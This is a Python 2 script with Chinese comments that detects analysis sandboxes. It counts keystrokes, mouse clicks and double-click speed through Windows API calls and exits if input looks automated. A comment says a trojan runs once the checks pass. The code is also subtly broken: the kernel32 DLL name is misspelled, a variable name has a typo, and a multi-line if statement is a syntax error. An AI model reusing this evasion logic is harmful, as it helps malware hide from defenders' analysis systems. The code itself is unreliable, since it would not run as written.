#!/usr/bin/python
#-*- coding:utf-8 -*-
#沙盒检测

import ctypes
import random
import time
import sys

user32=ctypes.windll.user32
kernerl32=ctypes.windll.kernerl32
#定义按键盘次数、鼠标单击、双击次数
keystrokes=0
mouse_clicks=0
double_clicks=0

#最后一次输入的时间
class LASTINPUTINFO(ctypes.Structure):
    _fields_=[("cbSize",ctypes.c_uint),
                    ("dwTime",ctypes.c_ulong)
                   ]
#获取最后一次输入到现在的时间差
def get_last_input():
    #初始化类
    struct_lastinputinfo=LASTINPUTINFO()
    #初始化大小
    struct_lastinputinfo.cbSize=ctypes.sizeof(LASTINPUTINFO)
    #获得最后一次输入的时间，填充到daTime字段中
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

    #获得自开机以来的运行时间
    run_time=kernerl32.GetTickCount()

    elapsed=run_time - struct_lastinputinfo.dwTime
    print "[*] It is been %d milliseconds since the last input event."%elapsed

    #返回时间差
    return elapsed

def get_key_press():
    global mouse_clicks
    global keystrokes
    #对所有可用键的范围进行迭代
    for i in range(0,0xff):
        #状态为-32767则发生了事件
        if user32.GetAsyncKeyState(i) == -32767:
            if i == 0x1:
                mouse_clicks+=1
                return time.time()
            elif i > 32 and i <127:
                keystrokes+=1
    return None

#沙盒测试主函数
def detect_sandbox():
    global mouse_clicks
    global keystrokes
    global double_clicks
    #设置阀值
    max_mouse_clicks=random.randint(5,25)
    max_keystrokes=random.randint(10,25)
    max_double_clicks=10
    double_click_threshold=0.250
    first_double_click=None

    average_mousetime=0
    max_input_threshold=30000

    previous_timestamp=None
    detection_complete=False

    last_input=get_last_input()
    #如果长时间没有用户输入，强制退出
    if last_input >= max_input_threshold:
        sys.exit(0)

    while not detection_complete:
        keypress_time=get_key_press()
        #如果发生点击，且有上一次点击，则计算双击是否发生
        if keypress_time is not None and previous_timestamp is not None:
            #计算两次点击的时间差，小于时间差则双击次数加一
            elapsed=keypress_time - previous_timestamp
            if elapsed <= double_click_threshold:
                double_clicks+=1
                #如果是第一次双击
                if first_double_click is None:
                    #记录第一次双击的时间
                    first_double_click=time.time()
                else:
                     #如果双击次数达到阀值
                    if double_clicks == max_double_clicks:
                        #如果双击频率十分快，则可能在沙盒中，强制退出
                        if keypress_time - first_double_click <= (max_double_clicks*double_click_threshold):
                            sys.exit(0)
                        #如果一切正常，达到阀值，退出沙盒，开始执行木马
                        if keystrokes >= max_keystrokes
                            and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
                            return

                        previous_timestamp=keypress_time
        #如果是第一次点击
        elif keypress_time is not None:
            revious_timestamp=keypress_time
detect_sandbox()
print "We are ok!"
